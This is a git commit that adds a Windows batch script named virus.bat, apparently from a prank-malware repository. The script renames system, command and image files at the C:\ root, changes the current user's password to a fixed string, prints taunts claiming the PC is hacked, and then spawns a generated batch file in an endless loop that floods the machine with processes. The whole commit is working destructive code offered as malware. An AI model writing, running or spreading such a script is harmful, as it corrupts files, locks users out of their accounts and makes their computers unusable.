7a5c76f1d5e98b44825dfacdb6fa4a59723a4fba
M@lwar3 <144142418+adoomyxx@users.noreply.github.com>
2024-10-29 20:57:11 +0400

    Add files via upload

---
+++ virus.bat
@@ -0,0 +1,14 @@
+@echo off
+cd C:\
+ren *.sys *.1c1j3
+ren *.cmd *.vqv12
+ren *.jpg *.vqi18
+net user %USERNAME% thepcishackedlol
+echo YOU SCARED %USERNAME%?
+pause
+echo YOU SHOULD BE I HAVE YOUR PC NOW YOUR SYSTEM FILES ARE DOOMED HAHAHA
+echo @echo off>>123.bat
+echo echo BUZZ OFF KIDDO>>123.bat
+:x
+start 123.bat
+goto x
